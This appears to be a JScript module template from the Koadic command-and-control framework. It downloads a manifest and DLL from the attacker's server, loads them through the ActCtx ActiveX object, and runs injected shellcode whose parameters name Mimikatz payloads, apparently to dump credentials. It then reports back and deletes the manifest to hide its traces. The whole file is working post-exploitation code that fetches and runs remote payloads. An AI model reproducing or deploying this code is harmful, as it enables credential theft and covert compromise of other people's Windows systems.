try
{
    var manifestPath = Koadic.file.getPath("~DIRECTORY~\\TashLib.manifest");
    Koadic.http.download(manifestPath, "~MANIFESTUUID~");

    Koadic.http.download("~DIRECTORY~\\TashLib.dll", "~DLLUUID~");

    var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );
    actCtx.Manifest = manifestPath;
    var tash =  actCtx.CreateObject("TashLib.TashLoader");

    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + Koadic.work.make_url();

    // TSC = "\x..."
    ~SHIMX86BYTES~

    var res = tash.Load(TSC, shim_lpParam, ~SHIMX86OFFSET~);

    Koadic.work.report("Success");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.file.deleteFile(manifestPath);
Koadic.exit();
